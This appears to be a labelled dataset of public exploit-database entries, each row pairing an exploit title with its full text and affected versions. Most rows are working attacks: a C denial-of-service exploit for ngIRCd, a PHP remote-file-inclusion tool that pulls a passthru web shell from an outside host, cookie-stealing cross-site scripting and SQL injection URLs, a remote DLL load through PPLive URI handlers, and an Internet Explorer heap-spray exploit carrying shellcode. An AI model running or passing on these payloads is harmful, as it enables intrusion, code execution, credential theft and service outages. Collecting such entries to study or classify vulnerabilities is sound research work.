25070,"ngIRCd 0.6/0.7/0.8 - Remote Buffer Overflow // source: https://www.securityfocus.com/bid/12397/info  ngIRCd is reported prone to a remote buffer overflow vulnerability. This issue presents itself because the application fails to perform proper boundary checks before copying user-supplied data into process buffers.  A successful attack may allow the attacker to crash the server or gain unauthorized access to a vulnerable computer.  ngIRCd 0.8.1 and prior versions are affected by this vulnerability.   /*       NGircd <= 0.8.1     Remote Denial Of Service       Coded by: Expanders        Usage:  ./ngircd_dos <Host> <Ip> <NickToUse> <ChannellToJoin>     NOTE:  The channel must be EMPTY to let the exploit use +I mode        Example:  */  #include <stdio.h> #include <string.h> #include <netdb.h> #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h>  void help(char *program_name);   int main(int argc, char *argv[]) {      struct sockaddr_in trg;      struct hostent *he;  long addr;      int sockfd, buff,rc;  char evilbuf[1024];  char buffer[1024];  char *nick=""AntiServer"";  char *channel=""Die_NGircd"";  char *request;  if(argv[3] != NULL) nick=argv[3];  if(argv[4] != NULL) channel=argv[4];  if(argc < 3 ) {   help(argv[0]);   exit(0);  }  printf(""\n\n-=[ NGircd <= 0.8.1 Remote DoS ::: Coded by Expanders ]=-\n"");      he = gethostbyname(argv[1]);      sockfd = socket(AF_INET, SOCK_STREAM, 0);      request = (char *) malloc(12344);      trg.sin_family = AF_INET;      trg.sin_port = htons(atoi(argv[2]));      trg.sin_addr = *((struct in_addr *) he->h_addr);      memset(&(trg.sin_zero), '\0', 8);  printf(""\n\nConnecting to target \t..."");  rc=connect(sockfd, (struct sockaddr *)&trg, sizeof(struct sockaddr_in));  if(rc==0)  {   printf(""[Done]\nBuilding evil buffer\t..."");   memset(evilbuf,65,300);   memset(evilbuf+300,64,1);   memset(evilbuf+301,65,128);   printf(""[Done]\nSending NICK           \t..."");   sprintf(request,""NICK %s\n"",nick);   send(sockfd,request,strlen(request),0);   printf(""[Done]\nSending USER           \t..."");   sprintf(request,""USER %s x0n3-h4ck.org eth0.x0n3-h4ck.org :%s\n"",nick,nick);   send(sockfd,request,strlen(request),0);   buff=recv(sockfd, buffer, 256, 0);   printf(""[Done]\nJoining Channel        \t..."");   sprintf(request,""JOIN #%s\n"",channel);   send(sockfd,request,strlen(request),0);   printf(""[Done]\nSending evil request   \t..."");   sprintf(request,""MODE #%s +I %s\n"",channel,evilbuf);   send(sockfd,request,strlen(request),0);   sprintf(request,""QUIT www.x0n3-h4ck.org\n"",evilbuf);   send(sockfd,request,strlen(request),0);   sleep(2);   printf(""[Done]\nTrying to reconnect\t..."");   close(sockfd);   sockfd = socket(AF_INET, SOCK_STREAM, 0);   sleep(1);   rc=connect(sockfd, (struct sockaddr *)&trg, sizeof(struct sockaddr_in));   if(rc==0)    printf(""[Fail] -> Damn! Attack Failed!\n\n"");   else    printf(""[Done] -> Attack Success! Lets party!\n\n"");  }  else   printf(""[Fail] -> Unable to connect\n\n"");  close(sockfd);  return 0;  }  void help(char *program_name) {   printf(""\n\t-=[      NGircd <= 0.8.1 Remote Denial Of Service      ]=-\n"");  printf(""\t-=[                                                    ]=-\n"");  printf(""\t-=[      Coded by ders -/www.x0n3-h4ck.org\\-      ]=-\n\n"");  printf(""Usage: %s <Host> <Ip> <NickToUse> <ChannellToJoin>\n"",program_name); }","['0.6/0.7/0.8', '0.8.1', 'prior versions']",1
2686,"phpBB Spider Friendly Module 1.3.10 - Remote File Inclusion #!/usr/bin/php -q -d short_open_tag=on <? print '     |                 \\\\     |                  \\\     |________   __________\____   ____.___ .____          |\______ \  \_   _____/\   \ /   /|   ||    |         | |    |  \  |    __)_  \   Y   / |   ||    |           |    `   \ |        \  \     /  |   ||    |___      |/_______  //_______  /   \___/   |___||_______ \     |        \/         \/    \\                   \/      ______________________   _\\__      _____        |\__    ___/\_   _____/  /  _  \    /     \       |  |    |    |    __)_  /  /_\  \  /  \ /  \      |  |    |    |        \/    |    \/    Y    \        |____|   /_______  /\____|__  /\____|__  / <---|--|----------------\/---------\/---------\/----/>     |  |                            \\\     |  | | | | |                     \\ //----------------------->     | DEVIL TEAM - POLISH TEAM        \\\/ http://www.rahim.webd.pl/ ___________              .__         ._\_ __    .__        _____        \_   _____/__  _________ |  |   ____ |__|/  |_  |__| _____/ ____\____    |    __)_\  \/  /\____ \|  |  /  _ \|  \   __\ |  |/    \   __\/  _ \   |        \>    < |  |_> >  |_(  <_> )  ||  |   |  |   |  \  | (  <_> ) /_______  /__/\_ \|   __/|____/\____/|__||__|   |__|___|  /__|  \____/  <-------\/------\/|__|-----------------------\----------\/------------->     | | | | |                                 \\      | Spider Friendly <= 1.3.10 (phpbb_root_path) Remote File Include Exploit     |  - ------------------------------------------------------------ -  	| Spider Friendly 1.3.10 is a module of phpBB modified by Przemo 	     |   Script name ....: Spider Friendly 1.3.10         Release Date ..: 2006/10/29     |   Script site ....: http://www.przemo.org/phpBB2/forum/download.php?id=5767 	 	|   Dork ....: ""& Spider Friendly by Crack"" 	|   Usage: http://site.org/admin/modules_data.php?phpbb_root_path=[shell] 	|     |   Find by ....: Kacper (a.k.a Rahim)      |   (c)od3d by Kacper 	|   Autor Site: http://www.rahim.webd.pl/ 	|   Contact: kacper1964@yahoo.pl 	|   DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam <----------------------------------------------------------------------/>     |     | Greetings DragonHeart and all DEVIL TEAM Patriots :)     |   | Leito - Leon - TomZen - Gelo - Ramzes - DMX - Ci2u - Larry     |   |   | @steriod - Drzewko - CrazzyIwan - ARCLITE - Rammstein - Adam 	|   |   |   | Kicaj - DeathSpeed - Arkadius - Michas - pepi - nukedclx     |   |   | SkD - MXZ - sysios - mIvus - wacky 	|   |   |   |   |   Greetings for 4ll Fusi0n Group mambers ;-) <---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---/>  ';  if ($argc<4) { print (' -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Usage: php '.$argv[0].' host shell cmd OPTIONS host:      script server (ip/hostname) shell:     path to shell cmd:       a shell command (ls -la) Options:  -p[port]:    specify a port other than 80  -P[ip:port]: specify a proxy Example: php '.$argv[0].' localhost http://www.evilsite.com/shell.txt ls -la -P1.1.1.1:80 shell.txt: <?php ob_clean();echo""Hacker_Kacper_Made_in_Poland!!..Hauru..^_^..the..best..polish..team..Greetz"";ini_set(""max_execution_time"",0);echo ""hauru"";passthru($_GET[""cmd""]);die;?> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- '); die; }  error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpackets($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock);   #debug   #echo ""\r\n"".$html; } function make_seed() {    list($usec, $sec) = explode(' ', microtime());    return (float) $sec + ((float) $usec * 100000); }  $host=$argv[1]; $shell=$argv[2]; $cmd="""";  $port=80; $proxy=""""; for ($i=3; $i<$argc; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if (($temp<>""-p"") and ($temp<>""-P"")) {$cmd.="" "".$argv[$i];} if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } }  if ($proxy=='') {$p='http://'.$host.':'.$port;}  $packet =""GET "".$p.""admin/modules_data.php?phpbb_root_path="".$shell.""?cmd="".$cmd.""%00 HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpackets($packet); if (strstr($html,""hauru"")) { $temp=explode(""hauru"",$html); die($temp[1]); } echo ""Exploit err0r :(""; echo ""Go to DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam""; ?>  # milw0rm.com [2006-10-30]",['1.3.10'],1
36934,SAP Business Objects InfoVew System - 'listing.aspx?searchText' Cross-Site Scripting source: https://www.securityfocus.com/bid/52361/info  SAP Business Objects is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  SAP Business Objects XI R2 is vulnerable; other versions may be affected.   http://www.example.com/businessobjects/enterprise115/InfoView/listing.aspx searchText=</script><script>alert(1);</script>,['XI R2'],1
28941,Immediacy .NET CMS 5.2 - 'Logon.aspx' Cross-Site Scripting source: https://www.securityfocus.com/bid/20965/info  Immediacy CMS is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Version 5.2 is vulnerable to this issue; other versions may also be affected.  http://www.example.com//logon.aspx?lang=<SCRIPT>alert('Can%20Cross%20Site%20Attack')</SCRIPT>,['5.2'],1
37965,"Keeper IP Camera 3.2.2.10 - Authentication Bypass # Exploit Title: Keeper IP Camera - Authentication Bypass # Date: 25/08/2015 # Exploit Author: RAT - ThiefKing # Vendor Homepage: http://www.keeper.cn/en/Camera-ip.asp # Version: 3.2.2.10 # WEB Version: 6.1.17.192 # Tested on: QB200W, QB130W, QA130W,...  Exploit: 1 - First, open your browser 2 - Enter the IP address or domain to see the login screen of the camera 3 - Now go to page umanage.asp (http://ipaddress:port/umanage.asp)  You can change or view passwords  TEST: http://server:88/login.asp --  RAT - ThiefKing http://tromcap.com",['3.2.2.10'],1
8215,"PPLive 1.9.21 - '/LoadModule' URI Handlers Argument Injection -------------------------------------------------------------------------------- PPLive <= 1.9.21 uri handlers ""/LoadModule"" remote argument injection by Nine:Situations:Group::strawdog -------------------------------------------------------------------------------- software site:http://www.pplive.com/en/index.html our site: http://retrogod.altervista.org/  software description: ""PPLive is a peer-to-peer streaming video network created in Huazhong University of Science and Technology, People's Republic of China. It is part of a new generation of P2P applications, that combine P2P and Internet TV, called P2PTV.""  vulnerability: The ""synacast://"", ""Play://"" ,""pplsv://"" and ""ppvod://"" URI handlers do not verify certain parts of the URI before evaluating command line parameters. This can be exploited against Internet Explorer to e.g. load a dll from a remote UNC path via the ""/LoadModule"" parameter, example exploit (IE7):  synacast://www.microsoft.com/?""%20/LoadModule%20\1.2.3.4\unc_share\sh.dll%20"" Play://www.microsoft.com/?""%20/LoadModule%20\\1.2.3.4\unc_share\sh.dll%20""  against older versions: pplsv://www.microsoft.com/?""%20/LoadModule%20\\1.2.3.4\unc_share\sh.dll%20"" ppvod://www.microsoft.com/?""%20/LoadModule%20\\1.2.3.4\unc_share\sh.dll%20""  test dll which adds new credentials / spawns the telnet server: http://retrogod.altervista.org/9sg_pplive_sh.html  some interesting readings: http://msdn.microsoft.com/en-us/library/aa767914(VS.85).aspx  --------------------------------------------------------------------------------  # milw0rm.com [2009-03-16]",['1.9.21'],1
25909,"Mensajeitor 1.8.9 - 'IP' HTML Injection source: https://www.securityfocus.com/bid/14071/info  Mensajeitor is prone to an HTML injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in dynamically generated content.  Attacker-supplied HTML and script code would be executed in the context of the affected Web site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.   http://www.example.com/mensajeitor.php?nick=megabyte&url=http://mbytesecurity.org&actualizar=null&titulo=aaa&ip='aa'>%3Ciframe%20src=http://mbytesecurity.org/bukle.htm&enviar =Enviar <http://www.example.com/mensajeitor.php?nick=megabyte&url=http://mbytesecurity.org&actualizar=null&titulo=aaa&ip=%27aa%27%3E%3Ciframe%20src=http://mbytesecurity.org/bukle.htm &enviar=Enviar>",['1.8.9'],1
20492,"ssldump 0.9 b1 - Format String source: https://www.securityfocus.com/bid/2096/info  ssldump is a traffic analyzer for monitoring network traffic in real time. It is written and maintained by Eric Rescorla. A problem exists which could allow the arbitrary execution of code.  The problem exists in the ssldump handling of format strings. ssldump requires elevated privileges to listen to traffic crossing the network interface. While monitoring traffic, the encounter of format strings in a URL will cause the program to segmentation fault. Potentially, this could lead to the overwriting of stack variables and arbitrary execution of code with administrative access, if exploited by a malicious user.   1) Run SSLDUMP (needs you to be root unless setuid)  2)Open Up Netscape Navigator it)  3) Type the following in Netscape Navigator: fixme:%s%s%s%s%s%s  4) watch as ssldump with gather the traffic then segfault..",['0.9 b1'],1
32646,"TWiki 4.x - 'URLPARAM' Cross-Site Scripting source: https://www.securityfocus.com/bid/32669/info  TWiki is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   An HTML form field must exist containing an input value with specifying an encoding. As an example:  <input type=""text"" name=""city"" value=""%URLPARAM{ ""city"" }%"" />  THe following examples will then demonstrate this issue:  http://example.com/twiki/view/TWiki/WebSearch?search=%27a%20onmouseover=alert(document.cookie)%20%27  http://example.com/twiki/view/TWiki/ResetPassword?username=""<script language=Javascript>alert('3y3 0wn j00 TWIKI')</script>",['4.x'],1
6863,"PacketTrap TFTPD 2.2.5459.0 - Remote Denial of Service #!/usr/bin/perl # Jeremy Brown [0xjbrown41@gmail.com/jbrownsec.blogspot.com] # PacketTrap TFTPD DoS (latest 2.2.5459.0 tested) -- www.packettrap.com # Must have Net::TFTP installed (easy to install, 'cpan' then 'install Net::TFTP' ;) # A product of tftpfuzz.pl (coming soon)  use Net::TFTP; use Getopt::Std;  $tftp = Net::TFTP->new(""192.168.0.112""); $tftp->ascii; $tftp->put(""test"", ""|"");  exit;  # milw0rm.com [2008-10-29]",['2.2.5459.0'],1
38955,"Command School Student Management System - '/sw/admin_subjects.php?id' SQL Injection source: https://www.securityfocus.com/bid/64707/info             Command School Student Management System is prone to the following security vulnerabilities:             1. Multiple SQL-injection vulnerabilities 2. A cross-site request forgery vulnerability 3. A cross-site scripting vulnerability 4. An HTML injection vulnerability 5. A security-bypass vulnerability             Exploiting these issues could allow an attacker to run malicious HTML and script codes, steal cookie-based authentication credentials, compromise the application, access or modify data, exploit latent vulnerabilities in the underlying database, or bypass certain security restrictions to perform unauthorized actions.             Command School Student Management System 1.06.01 is vulnerable; other versions may also be affected.   http://www.example.com/sw/admin_subjects.php?action=edit&id=null+and+1=2+union+select+version()",['1.06.01'],1
14519,"Barcodewiz Barcode ActiveX Control 3.29 - Remote HeapSpray (Internet Explorer 6/7) <!-- Title:		Barcodewiz 3.29 ActiveX Heap Spray Exploit Coded By:	Dr_IDE Found By:	loneferret Tested:		Windows XP SP3 on IE6 + IE7 Date:		July, 30 2010 --> <html> <object classid='clsid:CD3B09F1-26FB-41CD-B3F2-E178DFD3BCC6' id='target'></object> <script language='javascript'>  // Payload is win32_exec -  calc.exe    shellcode = unescape('%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395'+                       '%ufceb%uf4e2%uaec1%u951a%u463d%ud0d5%ucd01%u9022%u4745%u1eb1'+                       '%u5e72%ucad5%u471d%udcb5%u72b6%u94d5%u77d3%u0c9e%uc291%ue19e'+                       '%u873a%u9894%u843c%u61b5%u1206%u917a%ua348%ucad5%u4719%uf3b5'+                       '%u4ab6%u1e15%u5a62%u7e5f%u5ab6%u94d5%ucfd6%ub102%u8539%u556f'+                       '%ucd59%ua51e%u86b8%u9926%u06b6%u1e52%u5a4d%u1ef3%u4e55%u9cb5'+                       '%uc6b6%u95ee%u463d%ufdd5%u1901%u636f%u105d%u6dd7%u86be%uc525'+                       '%u3855%u7786%u2e4e%u6bc6%u48b7%u6a09%u25da%uf93f%u465e%u955e');    nops=unescape('%u9090%u9090');   headersize = 69;  //size adjusted for IE6/IE7 ""universality"" slackspace= headersize + shellcode.length; while(nops.length<slackspace) nops+=nops; fillblock=nops.substring(0,slackspace); block=nops.substring(0,nops.length-slackspace); while(block.length+slackspace<0x40000) block=block+block+fillblock; memory=new Array(); for( counter=0; counter<250; counter++) memory[counter]= block + shellcode;   ret=''; for( counter=0; counter<=1000; counter++) ret+=unescape(""%0a%0a%0a%0a"");    target.LoadProperties(ret); </script> </html>",['3.29'],1
